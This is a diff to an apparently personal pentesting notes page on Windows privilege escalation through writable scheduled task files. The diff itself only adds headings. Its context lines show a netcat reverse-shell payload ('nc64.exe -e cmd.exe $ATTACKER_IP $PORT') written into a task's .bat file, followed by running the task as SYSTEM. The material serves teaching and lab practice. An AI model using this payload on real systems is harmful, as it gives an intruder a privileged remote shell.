@@ -3,6 +3,7 @@ sidebar_position: 2
 title: Scheduled Tasks
 ---
 
+## Task Analysis
 
 - Retrieving the **Scheduled Tasks** on the System. If our Current User can **Modify or Overwrite** <b style={{ color: 'Brown' }}>[Task to Run]</b> Executable we can Control what gets Executed by the User.
 - <b style={{ color: 'Brown' }}>[Task to Run]</b> Indicates what gets Executed by the <span style={{fontWeight: 'Bold'}}>Scheduled Task</span> 
@@ -30,6 +31,8 @@ C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
 
 <br/>
 
+### PAYLOAD
+
 - Replacing the Contents of the <b style={{ color: 'Plum' }}>.bat</b> File with our <span style={{fontWeight: 'Bold'}}>PAYLOAD</span>
 
 ```log
@@ -38,7 +41,9 @@ C:\> echo c:\tools\nc64.exe -e cmd.exe $ATTACKER_IP $PORT > C:\tasks\schtask.bat
 
 <br/>
 
-- Starting the <b style={{ color: 'MediumTurquoise' }}>Task</b> **[In a Normal case Scenario we would have to Wait for the Task to be Started]**
+### Starting The Task
+
+- Starting the <b style={{ color: 'MediumTurquoise' }}>Task</b>. **[In a Normal case Scenario we would have to Wait for the Task to be Started]**
 
 ```log
 C:\> schtasks /run /tn vulntask
